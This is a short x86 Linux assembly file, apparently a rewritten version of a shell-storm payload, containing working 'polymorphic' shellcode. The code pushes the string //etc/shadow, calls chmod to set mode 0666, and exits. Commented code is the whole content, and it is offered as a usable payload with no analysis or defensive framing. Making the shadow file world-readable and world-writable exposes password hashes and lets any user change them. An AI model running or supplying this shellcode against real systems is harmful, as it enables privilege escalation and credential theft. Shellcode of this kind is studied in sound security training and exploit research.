;Polymorphic shellcode
;36 byte shellcode to chmod("/etc/shadow", 0666) and exit for Linux/x86
;Link: http://shell-storm.org/shellcode/files/shellcode-210.php

global _start
section .text

_start:
	xor ecx, ecx
	mul ecx			;zero out ECX and EAX
	push eax		;push 0

	;push //etc/shadow
	push 0x776F6461		;woda
	push 0x68732F63		;hs/c
	push 0x74652F2F		;te//

	;chmod syscall value (15)
	xor edx, edx	
	add edx, 10
	mov eax, edx
	add eax, 5		;EAX = 15

	;permissions into ecx
	mov ebx, esp
	mov cx, 666o		;permissions 0666 in ECX
	int 0x80		;execute

	xor eax, eax
	inc eax			;EAX is 1
	int 0x80		;exit
